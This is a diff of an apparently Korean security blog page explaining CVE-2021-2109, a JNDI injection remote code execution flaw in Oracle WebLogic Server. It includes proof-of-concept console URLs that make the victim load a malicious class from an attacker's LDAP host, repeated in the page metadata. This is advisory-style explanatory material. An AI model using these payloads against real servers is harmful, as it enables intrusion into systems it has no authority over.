@@ -13,15 +13,79 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw&#34;&gt;Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 &amp;#xBC0F; 14.1.1.0.0&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xC624;&amp;#xB77C;&amp;#xD074;&amp;#xC774; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &amp;#xC790;&amp;#xBC14; &amp;#xC6F9; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158; &amp;#xC11C;&amp;#xBC84;&amp;#xC778; Oracle WebLogic Server&amp;#xC5D0;&amp;#xC11C; JNDI Injection&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;JNDI(Java Naming and Directory Interface) : &amp;#xC790;&amp;#xBC14; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; &amp;#xC678;&amp;#xBD80; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; API&amp;#xB85C;, &amp;#xC6D0;&amp;#xACA9; &amp;#xC11C;&amp;#xBC84;&amp;#xC758; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; bind &amp;#xD574; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xB450; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xBA70; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC778; &lt;code&gt;com.bea.console.handles.JndiBindingHandle&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI&amp;#xC758; &lt;code&gt;context&lt;/code&gt;, &lt;code&gt;bindName&lt;/code&gt;, &lt;code&gt;serverName&lt;/code&gt; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xBC1B;&amp;#xC544; &amp;#xC774;&amp;#xB97C; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xD654; &amp;#xD558;&amp;#xACE0; &lt;code&gt;JNDIBindingAction&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC01; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xC758; &amp;#xC758;&amp;#xBBF8;&amp;#xC640; &amp;#xACF5;&amp;#xACA9; &amp;#xC870;&amp;#xAC74;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;context&lt;/code&gt; : &amp;#xC6D0;&amp;#xACA9; &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI &amp;#xC11C;&amp;#xBC84; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JNDI &amp;#xC11C;&amp;#xBC84;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xD55C; &amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;bindName&lt;/code&gt;: &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xC774;&amp;#xB984;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;#xC545;&amp;#xC131; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; java &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C; &amp;#xC774;&amp;#xB984;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;serverName&lt;/code&gt; : &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; &amp;#xC11C;&amp;#xBC84; &amp;#xC774;&amp;#xB984;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;AdminServer&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xB294; &amp;#xC138;&amp;#xBBF8;&amp;#xCF5C;&amp;#xB860; &lt;code&gt;;&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xBD84;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xC11C;&amp;#xBC84; &amp;#xD3EC;&amp;#xD2B8; 1088&amp;#xC5D0; &amp;#xC545;&amp;#xC131; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; java &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C; &lt;code&gt;exploit&lt;/code&gt; &amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; PoC&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;amp;_nfpb=true&amp;amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&amp;quot;ldap://[attacker_host];1:1088/exploit;AdminServer&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8;  &lt;code&gt;com.bea.console.handles.JndiContextHandle&lt;/code&gt; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;bindName&lt;/code&gt;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; &lt;code&gt;context&lt;/code&gt;&amp;#xC640; &lt;code&gt;serverName&lt;/code&gt;&amp;#xB9CC;&amp;#xC744; &amp;#xBC1B;&amp;#xC544; &amp;#xC704;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC74C; PoC&amp;#xB85C; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//[victim_host]/console/console.portal?_nfpb=true&amp;amp;_pageLabel=EJBTestHomePage&amp;amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&amp;quot;ldap://[attacker_host]:1088/exploit;AdminServer&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/Al1ex/CVE-2021-2109&#34;&gt;https://github.com/Al1ex/CVE-2021-2109&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] CVE-2021-2109 : 오라클 Weblogic Server 원격 코드 실행 취약점 - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw&#34;&gt;Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 &amp;#xBC0F; 14.1.1.0.0&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xC624;&amp;#xB77C;&amp;#xD074;&amp;#xC774; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &amp;#xC790;&amp;#xBC14; &amp;#xC6F9; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158; &amp;#xC11C;&amp;#xBC84;&amp;#xC778; Oracle WebLogic Server&amp;#xC5D0;&amp;#xC11C; JNDI Injection&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;JNDI(Java Naming and Directory Interface) : &amp;#xC790;&amp;#xBC14; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; &amp;#xC678;&amp;#xBD80; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; API&amp;#xB85C;, &amp;#xC6D0;&amp;#xACA9; &amp;#xC11C;&amp;#xBC84;&amp;#xC758; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; bind &amp;#xD574; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xB450; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xBA70; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC778; &lt;code&gt;com.bea.console.handles.JndiBindingHandle&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI&amp;#xC758; &lt;code&gt;context&lt;/code&gt;, &lt;code&gt;bindName&lt;/code&gt;, &lt;code&gt;serverName&lt;/code&gt; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xBC1B;&amp;#xC544; &amp;#xC774;&amp;#xB97C; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xD654; &amp;#xD558;&amp;#xACE0; &lt;code&gt;JNDIBindingAction&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC01; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xC758; &amp;#xC758;&amp;#xBBF8;&amp;#xC640; &amp;#xACF5;&amp;#xACA9; &amp;#xC870;&amp;#xAC74;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;context&lt;/code&gt; : &amp;#xC6D0;&amp;#xACA9; &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI &amp;#xC11C;&amp;#xBC84; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JNDI &amp;#xC11C;&amp;#xBC84;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xD55C; &amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;bindName&lt;/code&gt;: &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; JNDI &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xC774;&amp;#xB984;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;#xC545;&amp;#xC131; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; java &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C; &amp;#xC774;&amp;#xB984;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;serverName&lt;/code&gt; : &amp;#xBC14;&amp;#xC778;&amp;#xB529;&amp;#xD560; &amp;#xC11C;&amp;#xBC84; &amp;#xC774;&amp;#xB984;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;AdminServer&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xB294; &amp;#xC138;&amp;#xBBF8;&amp;#xCF5C;&amp;#xB860; &lt;code&gt;;&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xBD84;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xC11C;&amp;#xBC84; &amp;#xD3EC;&amp;#xD2B8; 1088&amp;#xC5D0; &amp;#xC545;&amp;#xC131; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; java &amp;#xD074;&amp;#xB798;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C; &lt;code&gt;exploit&lt;/code&gt; &amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; PoC&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;amp;_nfpb=true&amp;amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&amp;quot;ldap://[attacker_host];1:1088/exploit;AdminServer&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8;  &lt;code&gt;com.bea.console.handles.JndiContextHandle&lt;/code&gt; &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;bindName&lt;/code&gt;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; &lt;code&gt;context&lt;/code&gt;&amp;#xC640; &lt;code&gt;serverName&lt;/code&gt;&amp;#xB9CC;&amp;#xC744; &amp;#xBC1B;&amp;#xC544; &amp;#xC704;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC74C; PoC&amp;#xB85C; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//[victim_host]/console/console.portal?_nfpb=true&amp;amp;_pageLabel=EJBTestHomePage&amp;amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&amp;quot;ldap://[attacker_host]:1088/exploit;AdminServer&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/Al1ex/CVE-2021-2109&#34;&gt;https://github.com/Al1ex/CVE-2021-2109&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/01/26/l0ch/2021-01-26/">
@@ -264,16 +328,13 @@
 </ul>
 </li>
 <li><p>&#xAC01; &#xD544;&#xB4DC;&#xB294; &#xC138;&#xBBF8;&#xCF5C;&#xB860; <code>;</code>&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p>
-<br></li>
+<p><br></p>
+</li>
 </ul>
 <p>&#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8; 1088&#xC5D0; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; java &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C; <code>exploit</code> &#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&quot;ldap://[attacker_host];1:1088/exploit;AdminServer&quot;)</span></code></pre>
-
 <p>&#xB450; &#xBC88;&#xC9F8;  <code>com.bea.console.handles.JndiContextHandle</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; <code>bindName</code>&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>context</code>&#xC640; <code>serverName</code>&#xB9CC;&#xC744; &#xBC1B;&#xC544; &#xC704;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; PoC&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/console.portal?_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&quot;ldap://[attacker_host]:1088/exploit;AdminServer&quot;)</span></code></pre>
-
-
-
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Al1ex/CVE-2021-2109">https://github.com/Al1ex/CVE-2021-2109</a></p>
 
             </div>
